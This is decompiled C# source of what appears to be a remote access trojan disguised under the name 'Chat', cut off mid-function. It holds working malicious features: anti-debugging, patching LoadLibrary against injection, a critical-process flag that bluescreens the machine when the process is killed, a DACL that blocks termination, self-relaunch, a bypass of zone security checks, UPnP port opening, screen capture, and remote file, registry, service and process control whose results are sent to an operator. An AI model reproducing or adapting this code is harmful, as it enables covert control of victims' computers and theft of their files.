namespace Chat
{
    using Chat.My;
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.VisualBasic.FileIO;
    using Microsoft.Win32;
    using NATUPNPLib;
    using System;
    using System.Collections;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Management;
    using System.Net;
    using System.Net.NetworkInformation;
    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.AccessControl;
    using System.Security.Principal;
    using System.ServiceProcess;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class Funzioni
    {
        private static IPHostEntry IpCollection = Dns.GetHostByName(Dns.GetHostName());
        private static string IPLocale = IpCollection.AddressList.GetValue(0).ToString();
        private static IStaticPortMappingCollection Mapping = Nat.StaticPortMappingCollection;
        private static UPnPNAT Nat = new UPnPNATClass();
        public static bool NewxtPart = false;
        private static RegistryKey RegKeys;
        private static WindowsClass WindowsList;
        private static string WindowsString = string.Empty;

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__2(object a0)
        {
            Socketss.Connect(Conversions.ToString(a0));
        }

        [CompilerGenerated]
        private static void _Lambda$__3()
        {
            string name = Assembly.GetExecutingAssembly().GetName().Name;
            while (true)
            {
                while (Process.GetProcessesByName(name).Length >= 2)
                {
                }
                if (Environment.GetCommandLineArgs().Length > 1)
                {
                    Process.Start(name);
                }
                else
                {
                    Process.Start(name, "_");
                }
            }
        }

        public static void AddUnlockPORT(ushort Port, string IPx, string Desc, string Type)
        {
            try
            {
                string bstrInternalClient = IPx;
                bstrInternalClient = bstrInternalClient.Replace("127.0.0.1", IPLocale).ToUpper().Replace("LOCALHOST", IPLocale);
                Mapping.Add(Port, Type, Port, bstrInternalClient, true, Desc);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("UPNP|S|ER", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void AntiDebug()
        {
            Process currentProcess = Process.GetCurrentProcess();
            if (Debugger.IsAttached)
            {
                Console.WriteLine("Debugger IsAttached detected. Exiting...");
                Console.ReadKey();
                Environment.Exit(0);
            }
            if (Win32.IsDebuggerPresent())
            {
                Console.WriteLine("Debugger IsDebuggerPresent detected. Exiting...");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }

        public static void AntiDllInjection()
        {
            uint num;
            IntPtr procAddress = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32"), "LoadLibraryA");
            IntPtr lpBaseAddress = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32"), "LoadLibraryW");
            if (procAddress != IntPtr.Zero)
            {
                num = 0;
                Win32.WriteProcessMemory(Process.GetCurrentProcess().Handle, procAddress, new byte[] { 0xc2, 4, 0, 0x90 }, 4, ref num);
            }
            if (lpBaseAddress != IntPtr.Zero)
            {
                num = 0;
                Win32.WriteProcessMemory(Process.GetCurrentProcess().Handle, lpBaseAddress, new byte[] { 0xc2, 4, 0, 0x90 }, 4, ref num);
            }
        }

        public static void BlueScreenOnTermination(bool Enable)
        {
            int processInformation = (int) -(Enable > false);
            Win32.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1d, ref processInformation, 4);
        }

        public static void CloseServices(int Index)
        {
            try
            {
                ServiceController.GetServices()[Index].Close();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void ContinueServices(int Index)
        {
            try
            {
                ServiceController.GetServices()[Index].Continue();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static int controllaproc(string testo, string WIndowdosTitile)
        {
            switch (testo)
            {
                case "chrome.exe":
                case "chrome *32.exe":
                case "chrome":
                case "chrome *32":
                    return 3;

                case "audiodg":
                case "audiodg *32":
                    return 12;

                case "firefox":
                case "firefox *32":
                    return 4;

                case "avastui":
                case "avastui *32":
                    return 15;

                case "minecraft":
                case "minecraft *32":
                case "javaw":
                case "javaw *32":
                    if (WIndowdosTitile.Contains("Minecraft"))
                    {
                        return 5;
                    }
                    return 0;

                case "mspaint":
                case "mspaint *32":
                    return 0x10;

                case "explorer":
                case "explorer *32":
                    return 20;

                case "watchdog":
                    return 14;

                case "cmd":
                case "conhost":
                    return 2;

                case "skype":
                case "Skype *32":
                case "Skype":
                    return 0x11;

                case "PeerBlock":
                case "peerblock":
                case "Peerblock *32":
                    return 0x12;

                case "vbexpress":
                case "vbexpress *32":
                case "WDExpress":
                case "WDExpress *32":
                case "devenv":
                case "devenv *32":
                    return 0x13;

                case "devenv.exe":
                case "devenv *32":
                    return 0x13;

                case "samp":
                case "samp *32":
                    return 6;

                case "utorrent":
                case "utorrent *32":
                case "uTorrent *32":
                case "uTorrent":
                    return 13;

                case "Steam":
                case "Steam *32":
                    return 0x15;

                case "Origin":
                case "Origin *32":
                    return 0x16;

                case "hamachi-2-ui":
                case "hamachi-2-ui *32":
                    return 0x17;

                case "TeamViewer":
                case "TeamViewer *32":
                case "tv_w32":
                case "tv_w32 *32":
                case "tv_x64":
                case "tv_x64 *32":
                case "TeamViewer_Service":
                case "TeamViewer_Service *32":
                    return 0x18;

                case "avgemca":
                case "avgemca *32":
                case "avgnsa":
                case "avgemca *32":
                    return 0x19;

                case "notepad":
                    return 0x1a;
            }
            return 0;
        }

        public static void CreateSubKeysFunc(string Patch, string NameKeys)
        {
            try
            {
                MyProject.Computer.Registry.SetValue(Patch + @"\" + NameKeys, "Value01", "CustomValue");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("RegER|S|Error during create your Subkeys", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void DeletKeys(string Patch, string name)
        {
            if (Patch.StartsWith("HKEY_CLASSES_ROOT"))
            {
                Patch = Patch.Replace(@"HKEY_CLASSES_ROOT\", null);
                RegKeys = Registry.ClassesRoot;
            }
            else if (Patch.StartsWith("HKEY_CURRENT_USER"))
            {
                RegKeys = Registry.CurrentUser;
                Patch = Patch.Replace(@"HKEY_CURRENT_USER\", null);
            }
            else if (Patch.StartsWith("HKEY_LOCAL_MACHINE"))
            {
                RegKeys = Registry.LocalMachine;
                Patch = Patch.Replace(@"HKEY_LOCAL_MACHINE\", null);
            }
            else if (Patch.StartsWith("HKEY_USERS"))
            {
                RegKeys = Registry.Users;
                Patch = Patch.Replace(@"HKEY_USERS\", null);
            }
            else if (Patch.StartsWith("HKEY_CURRENT_CONFIG"))
            {
                RegKeys = Registry.CurrentConfig;
                Patch = Patch.Replace(@"HKEY_CURRENT_CONFIG\", null);
            }
            RegKeys.OpenSubKey(Patch, true);
            RegKeys.DeleteValue(name);
        }

        public static void DellSubKeys(string Patch)
        {
            try
            {
                if (Patch.StartsWith("HKEY_CLASSES_ROOT"))
                {
                    MyProject.Computer.Registry.ClassesRoot.DeleteSubKeyTree(Patch.Replace(@"HKEY_CLASSES_ROOT\", null));
                }
                else if (Patch.StartsWith("HKEY_CURRENT_USER"))
                {
                    MyProject.Computer.Registry.CurrentUser.DeleteSubKeyTree(Patch.Replace(@"HKEY_CURRENT_USER\", null));
                }
                else if (Patch.StartsWith("HKEY_LOCAL_MACHINE"))
                {
                    MyProject.Computer.Registry.LocalMachine.DeleteSubKeyTree(Patch.Replace(@"HKEY_LOCAL_MACHINE\", null));
                }
                else if (Patch.StartsWith("HKEY_USERS"))
                {
                    MyProject.Computer.Registry.Users.DeleteSubKeyTree(Patch.Replace(@"HKEY_USERS\", null));
                }
                else if (Patch.StartsWith("HKEY_CURRENT_CONFIG"))
                {
                    MyProject.Computer.Registry.CurrentConfig.DeleteSubKeyTree(Patch.Replace(@"HKEY_CURRENT_CONFIG\", null));
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("RegER|S|Error during delete your Subkeys", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static Image Desktop()
        {
            Rectangle bounds = new Rectangle();
            Bitmap image = null;
            bounds = Screen.PrimaryScreen.Bounds;
            image = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format48bppRgb);
            Graphics.FromImage(image).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return image;
        }

        private static void DisableShowHiddenFiles()
        {
            string keyName = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
            MyProject.Computer.Registry.SetValue(keyName, "Hidden", "0", RegistryValueKind.DWord);
        }

        public static void DisableZonechecks()
        {
            try
            {
                Process process = new Process();
                ProcessStartInfo info = new ProcessStartInfo();
                info.FileName = "cmd";
                info.RedirectStandardInput = true;
                info.RedirectStandardOutput = true;
                info.UseShellExecute = false;
                info.CreateNoWindow = true;
                process.StartInfo = info;
                process.Start();
                StreamWriter standardInput = process.StandardInput;
                standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + Application.ExecutablePath + ":ZONE.identifier");
                standardInput.WriteLine("exit");
                standardInput.Close();
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                try
                {
                    Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    ProjectData.ClearProjectError();
                }
                ProjectData.ClearProjectError();
            }
        }

        public static void DownloadFile(string[] info)
        {
            new DownloadFromURL(info[0]).StartDownload(info);
        }

        public static void DownlodRemoto(object IndirizzoFilex)
        {
            string file = Conversions.ToString(IndirizzoFilex);
            MemoryStream stream = new MemoryStream(MyProject.Computer.FileSystem.ReadAllBytes(file));
            long num2 = FileSystem.FileLen(file);
            Socketss.ListDataSend.Add(new Data("Len|S|" + Conversions.ToString(num2), null, null));
            Thread.Sleep(3);
            int num = Socketss.client.SendBufferSize - 1;
            if (num >= 0x2001)
            {
                num = 0x2000;
            }
            NewxtPart = true;
            byte[] buffer = new byte[num + 1];
            if (num2 > buffer.Length)
            {
                long num4 = num2;
                long length = buffer.Length;
                for (long i = 0L; ((length >> 0x3f) ^ i) <= ((length >> 0x3f) ^ num4); i += length)
                {
                    while (true)
                    {
                        if (NewxtPart)
                        {
                            NewxtPart = false;
                            Thread.Sleep(70);
                            break;
                        }
                        Thread.Sleep(50);
                    }
                    if ((num2 - i) > buffer.Length)
                    {
                        stream.Read(buffer, 0, buffer.Length);
                        Socketss.ListDataFileM.Add(new Data("DW", null, buffer));
                    }
                    else
                    {
                        Thread.Sleep(50);
                        byte[] buffer2 = new byte[((int) ((num2 - i) - 1L)) + 1];
                        stream.Read(buffer2, 0, (int) (num2 - i));
                        Socketss.ListDataFileM.Add(new Data("FD", null, buffer2));
                    }
                }
            }
            else
            {
                Thread.Sleep(50);
                byte[] buffer3 = new byte[((int) num2) + 1];
                stream.Read(buffer3, 0, (int) num2);
                Socketss.ListDataFileM.Add(new Data("FD", null, buffer3));
            }
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int EnumWindows(WindowsClass ENUMS, int IND);
        public static void FindFiles(string Patch, string Ext)
        {
            try
            {
                string str;
                short num = 0;
                foreach (string str2 in MyProject.Computer.FileSystem.GetFiles(Patch + @"\", SearchOption.SearchAllSubDirectories, new string[] { Ext }))
                {
                    str = str + str2 + "\r\n";
                    num = (short) (num + 1);
                }
                Socketss.ListDataSend.Add(new Data("FoundFi|S|" + str + "|S|" + Conversions.ToString((int) num), null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                Socketss.ListDataSend.Add(new Data("FoundFis|S|" + exception.ToString(), null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void GetConnectionsList()
        {
            try
            {
                string str = string.Empty;
                foreach (TcpConnectionInformation information in IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections())
                {
                    str = str + string.Format("{0}%&/{1}%&/{2}%&/", information.LocalEndPoint, information.RemoteEndPoint, information.State);
                }
                Socketss.ListDataSend.Add(new Data("NetW|S|" + str, null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            GC.Collect();
        }

        public static string GetCPU()
        {
            string str = string.Empty;
            try
            {
                ManagementObjectCollection.ManagementObjectEnumerator enumerator;
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM CIM_Processor");
                try
                {
                    enumerator = searcher.Get().GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        ManagementObject current = (ManagementObject) enumerator.Current;
                        str = current.GetPropertyValue("Name").ToString();
                        if (!string.IsNullOrEmpty(str))
                        {
                            return str;
                        }
                    }
                }
                finally
                {
                    if (enumerator != null)
                    {
                        enumerator.Dispose();
                    }
                }
            }
            catch (ManagementException exception1)
            {
                ProjectData.SetProjectError(exception1);
                ManagementException exception = exception1;
                string str2 = "N/A";
                ProjectData.ClearProjectError();
                return str2;
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public static string GetDrives()
        {
            string str2;
            int num4;
            try
            {
                int num5;
            Label_0001:
                ProjectData.ClearProjectError();
                int num3 = -2;
            Label_000A:
                num5 = 2;
                DriveInfo[] drives = DriveInfo.GetDrives();
            Label_0013:
                num5 = 3;
                string str = null;
            Label_0018:
                num5 = 4;
                int num2 = drives.Length - 1;
                int index = 0;
                goto Label_00AB;
            Label_0029:
                num5 = 5;
                if (!drives[index].IsReady)
                {
                    goto Label_00A3;
                }
            Label_003A:
                num5 = 6;
                str = str + drives[index].ToString() + "|H|" + GetSize(drives[index].TotalSize) + "/" + GetSize(drives[index].AvailableFreeSpace) + "";
            Label_00A3:
                num5 = 8;
                index++;
            Label_00AB:
                if (index <= num2)
                {
                    goto Label_0029;
                }
            Label_00B7:
                num5 = 9;
                str2 = str;
                goto Label_0150;
            Label_00CF:
                num4 = 0;
                switch ((num4 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_000A;

                    case 3:
                        goto Label_0013;

                    case 4:
                        goto Label_0018;

                    case 5:
                        goto Label_0029;

                    case 6:
                        goto Label_003A;

                    case 7:
                    case 8:
                        goto Label_00A3;

                    case 9:
                        goto Label_00B7;

                    case 10:
                        goto Label_0150;

                    default:
                        goto Label_0145;
                }
            Label_0105:
                num4 = num5;
                switch (((num3 > -2) ? num3 : 1))
                {
                    case 0:
                        goto Label_0145;

                    case 1:
                        goto Label_00CF;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0105;
            }
        Label_0145:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0150:
            if (num4 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return str2;
        }

        public static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
        {
            RawSecurityDescriptor descriptor;
            int num3;
            try
            {
                uint num;
                int num4;
            Label_0001:
                ProjectData.ClearProjectError();
                int num2 = -2;
            Label_0009:
                num4 = 2;
                byte[] pSecurityDescriptor = new byte[0];
            Label_0013:
                num4 = 3;
                Win32.GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0, ref num);
            Label_0022:
                num4 = 4;
                if (num <= 0x7fffL)
                {
                    goto Label_003F;
                }
            Label_0035:
                num4 = 5;
                throw new Win32Exception();
            Label_003F:
                num4 = 7;
                if (Win32.GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper<byte[]>(ref pSecurityDescriptor, new byte[(((int) ((uint) ((UIntPtr) num))) - 1) + 1]), num, ref num))
                {
                    goto Label_007B;
                }
            Label_0071:
                num4 = 8;
                throw new Win32Exception();
            Label_007B:
                num4 = 10;
                descriptor = new RawSecurityDescriptor(pSecurityDescriptor, 0);
                goto Label_011B;
            Label_0099:
                num3 = 0;
                switch ((num3 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0013;

                    case 4:
                        goto Label_0022;

                    case 5:
                        goto Label_0035;

                    case 6:
                    case 7:
                        goto Label_003F;

                    case 8:
                        goto Label_0071;

                    case 9:
                    case 10:
                        goto Label_007B;

                    case 11:
                        goto Label_011B;

                    default:
                        goto Label_0110;
                }
            Label_00D3:
                num3 = num4;
                switch (((num2 > -2) ? num2 : 1))
                {
                    case 0:
                        goto Label_0110;

                    case 1:
                        goto Label_0099;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_00D3;
            }
        Label_0110:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_011B:
            if (num3 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return descriptor;
        }

        public static void GetRegistrySubKey(string Path)
        {
            try
            {
                string str = string.Empty;
                if (Path.Contains(@"\"))
                {
                    if (Path.StartsWith("HKEY_CLASSES_ROOT"))
                    {
                        RegKeys = Registry.ClassesRoot.OpenSubKey(Path.Replace(@"HKEY_CLASSES_ROOT\", ""), true);
                    }
                    else if (Path.StartsWith("HKEY_CURRENT_USER"))
                    {
                        RegKeys = Registry.CurrentUser.OpenSubKey(Path.Replace(@"HKEY_CURRENT_USER\", ""), true);
                    }
                    else if (Path.StartsWith("HKEY_LOCAL_MACHINE"))
                    {
                        RegKeys = Registry.LocalMachine.OpenSubKey(Path.Replace(@"HKEY_LOCAL_MACHINE\", ""), true);
                    }
                    else if (Path.StartsWith("HKEY_USERS"))
                    {
                        RegKeys = Registry.Users.OpenSubKey(Path.Replace(@"HKEY_USERS\", ""), true);
                    }
                    else if (Path.StartsWith("HKEY_CURRENT_CONFIG"))
                    {
                        RegKeys = Registry.CurrentConfig.OpenSubKey(Path.Replace(@"HKEY_CURRENT_CONFIG\", ""), true);
                    }
                    foreach (string str2 in RegKeys.GetSubKeyNames())
                    {
                        str = str + str2 + "|";
                    }
                    Socketss.ListDataSend.Add(new Data("RegyList|S|" + str, null, null));
                    GetSubKeys();
                }
                else
                {
                    if (Path == "HKEY_CLASSES_ROOT")
                    {
                        RegKeys = Registry.ClassesRoot;
                    }
                    else if (Path == "HKEY_CURRENT_USER")
                    {
                        RegKeys = Registry.CurrentUser;
                    }
                    else if (Path == "HKEY_LOCAL_MACHINE")
                    {
                        RegKeys = Registry.LocalMachine;
                    }
                    else if (Path == "HKEY_USERS")
                    {
                        RegKeys = Registry.Users;
                    }
                    else if (Path == "HKEY_CURRENT_CONFIG")
                    {
                        RegKeys = Registry.CurrentConfig;
                    }
                    foreach (string str3 in RegKeys.GetSubKeyNames())
                    {
                        str = str + str3 + "|";
                    }
                    Socketss.ListDataSend.Add(new Data("RegyList|S|" + str, null, null));
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("RegER|S|Error in read the path of Registry", null, null));
                ProjectData.ClearProjectError();
            }
        }

        public static void GetServicesList()
        {
            try
            {
                IEnumerator enumerator;
                ServiceController[] services = ServiceController.GetServices();
                ListView view = new ListView();
                int num2 = Information.UBound(services, 1);
                for (int i = 0; i <= num2; i++)
                {
                    ListViewItem item2 = view.Items.Add(services[i].ServiceName);
                    item2.SubItems.Add(services[i].DisplayName);
                    item2.SubItems.Add(services[i].ServiceType.ToString());
                    item2.SubItems.Add(services[i].Status.ToString());
                    item2 = null;
                }
                string str = "";
                try
                {
                    enumerator = view.Items.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        ListViewItem current = (ListViewItem) enumerator.Current;
                        str = str + current.Text + "|" + current.SubItems[1].Text + "|" + current.SubItems[2].Text + "|" + current.SubItems[3].Text + "\r\n";
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
                str = str.Trim();
                Socketss.ListDataSend.Add(new Data("Serv|S|" + str, null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static string GetSize(long Bytes)
        {
            if (Bytes >= 0x40000000L)
            {
                return (Strings.Format(((((double) Bytes) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GB");
            }
            if (Bytes >= 0x100000L)
            {
                return (Strings.Format((((double) Bytes) / 1024.0) / 1024.0, "#0.00") + " MB");
            }
            if (Bytes >= 0x400L)
            {
                return (Strings.Format(((double) Bytes) / 1024.0, "#0.00") + " KB");
            }
            if (Bytes < 0x400L)
            {
                return (Conversions.ToString(Conversion.Fix(Bytes)) + " Bytes");
            }
            return "0 Bytes";
        }

        public static void GetSubKeys()
        {
            try
            {
                IEnumerator enumerator;
                string str = string.Empty;
                ListView view = new ListView();
                foreach (string str2 in RegKeys.GetValueNames())
                {
                    if (RegKeys.GetValueKind(str2) == RegistryValueKind.Binary)
                    {
                        ListViewItem item2 = view.Items.Add(str2);
                        item2.SubItems.Add(RegKeys.GetValueKind(str2).ToString());
                        item2.SubItems.Add(Encoding.UTF8.GetString((byte[]) RegKeys.GetValue(str2, "(No Value)")));
                        item2 = null;
                    }
                    else
                    {
                        ListViewItem item3 = view.Items.Add(str2);
                        item3.SubItems.Add(RegKeys.GetValueKind(str2).ToString());
                        NewLateBinding.LateCall(item3.SubItems, null, "Add", new object[] { RuntimeHelpers.GetObjectValue(RegKeys.GetValue(str2, "(No Value)")) }, null, null, null, true);
                        item3 = null;
                    }
                }
                try
                {
                    enumerator = view.Items.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        ListViewItem current = (ListViewItem) enumerator.Current;
                        str = str + current.Text + "|" + current.SubItems[1].Text + "|" + current.SubItems[2].Text + "\r\n";
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
                str = str.Trim();
                Socketss.ListDataSend.Add(new Data("RegyValue|S|" + str, null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private static bool GetWindowData(IntPtr h, IntPtr hh)
        {
            try
            {
                int capacity = GetWindowTextLength(h) + 1;
                if (capacity > 1)
                {
                    StringBuilder hH = new StringBuilder(capacity);
                    GetWindowText(h, hH, capacity);
                    WindowsString = WindowsString + string.Format("{0}\x00a3$%{1}\x00a3$%{2}\x00a3$%", hH.ToString(), h, IsWindowVisible(h));
                }
                return true;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return false;
        }

        [DllImport("user32", EntryPoint="GetWindowTextA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int GetWindowText(IntPtr H, StringBuilder HH, int IND);
        [DllImport("user32", EntryPoint="GetWindowTextLengthA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int GetWindowTextLength(IntPtr H);
        private static T InlineAssignHelper<T>(ref T target, T value)
        {
            T local;
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                target = value;
            Label_0012:
                num3 = 3;
                local = value;
                goto Label_0082;
            Label_001D:;
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0012;

                    case 4:
                        goto Label_0082;

                    default:
                        goto Label_0077;
                }
            Label_003D:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_0077;

                    case 1:
                        goto Label_001D;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_003D;
            }
        Label_0077:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0082:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return local;
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern bool IsWindowVisible(IntPtr H);
        public static void KillProc(string name)
        {
            try
            {
                Process.GetProcessById(Conversions.ToInteger(name)).Kill();
                Thread.Sleep(20);
                Thread thread = new Thread(new ThreadStart(Funzioni.TaskList));
                thread.IsBackground = false;
                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void MsgBoxShow(string[] cut)
        {
            MessageBoxButtons yesNo;
            MessageBoxIcon asterisk;
            switch (cut[1])
            {
                case "1":
                    asterisk = MessageBoxIcon.Asterisk;
                    break;

                case "2":
                    asterisk = MessageBoxIcon.Question;
                    break;

                case "3":
                    asterisk = MessageBoxIcon.Exclamation;
                    break;

                case "4":
                    asterisk = MessageBoxIcon.Hand;
                    break;
            }
            string str2 = cut[2];
            if (str2 == "1")
            {
                yesNo = MessageBoxButtons.YesNo;
            }
            else if (str2 == "2")
            {
                yesNo = MessageBoxButtons.YesNoCancel;
            }
            else if (str2 == "3")
            {
                yesNo = MessageBoxButtons.OK;
            }
            else if (str2 == "4")
            {
                yesNo = MessageBoxButtons.OKCancel;
            }
            else if (str2 == "5")
            {
                yesNo = MessageBoxButtons.RetryCancel;
            }
            else if (str2 == "6")
            {
                yesNo = MessageBoxButtons.AbortRetryIgnore;
            }
            MessageBox.Show(cut[4], cut[3], yesNo, asterisk);
        }

        public static void ProtectProcess()
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                IntPtr currentProcess = Win32.GetCurrentProcess();
            Label_0012:
                num3 = 3;
                RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
            Label_001C:
                num3 = 4;
                processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 0x1f0fff, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
            Label_0041:
                num3 = 5;
                SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
                goto Label_00BF;
            Label_0054:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0012;

                    case 4:
                        goto Label_001C;

                    case 5:
                        goto Label_0041;

                    case 6:
                        goto Label_00BF;

                    default:
                        goto Label_00B4;
                }
            Label_0079:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_00B4;

                    case 1:
                        goto Label_0054;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0079;
            }
        Label_00B4:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_00BF:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        public static void RefreshFileManager(string Percorso)
        {
            int num6;
            try
            {
                int num7;
            Label_0001:
                ProjectData.ClearProjectError();
                int num5 = -2;
            Label_000A:
                num7 = 2;
                string[] directories = Directory.GetDirectories(Percorso);
            Label_0014:
                num7 = 3;
                string str = null;
            Label_0019:
                num7 = 4;
                int num3 = directories.Length - 1;
                int index = 0;
                goto Label_004B;
            Label_0027:
                num7 = 5;
                str = str + directories[index] + "∞";
            Label_0039:
                num7 = 6;
                Thread.Sleep(1);
            Label_0043:
                num7 = 7;
                index++;
            Label_004B:
                if (index <= num3)
                {
                    goto Label_0027;
                }
            Label_0054:
                num7 = 8;
                str = str + "➽";
            Label_0063:
                num7 = 9;
                string[] files = Directory.GetFiles(Percorso);
            Label_006E:
                num7 = 10;
                int num4 = files.Length - 1;
                int num2 = 0;
                goto Label_00D3;
            Label_007E:
                num7 = 11;
                str = str + files[num2] + "☎" + GetSize(FileSystem.FileLen(files[num2])) + "♨";
            Label_00C8:
                num7 = 12;
                num2++;
            Label_00D3:
                if (num2 <= num4)
                {
                    goto Label_007E;
                }
            Label_00DD:
                num7 = 13;
                Socketss.ListDataSend.Add(new Data("FMDIR|S|" + str, null, null));
                goto Label_019C;
            Label_010B:
                num6 = 0;
                switch ((num6 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_000A;

                    case 3:
                        goto Label_0014;

                    case 4:
                        goto Label_0019;

                    case 5:
                        goto Label_0027;

                    case 6:
                        goto Label_0039;

                    case 7:
                        goto Label_0043;

                    case 8:
                        goto Label_0054;

                    case 9:
                        goto Label_0063;

                    case 10:
                        goto Label_006E;

                    case 11:
                        goto Label_007E;

                    case 12:
                        goto Label_00C8;

                    case 13:
                        goto Label_00DD;

                    case 14:
                        goto Label_019C;

                    default:
                        goto Label_0191;
                }
            Label_0151:
                num6 = num7;
                switch (((num5 > -2) ? num5 : 1))
                {
                    case 0:
                        goto Label_0191;

                    case 1:
                        goto Label_010B;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0151;
            }
        Label_0191:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_019C:
            if (num6 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        public static void RefreshSingolServices(int Index)
        {
            try
            {
                ServiceController.GetServices()[Index].Refresh();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void RefreshUPNP()
        {
            try
            {
                string str;
                IEnumerator enumerator;
                try
                {
                    enumerator = Mapping.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        IStaticPortMapping current = (IStaticPortMapping) enumerator.Current;
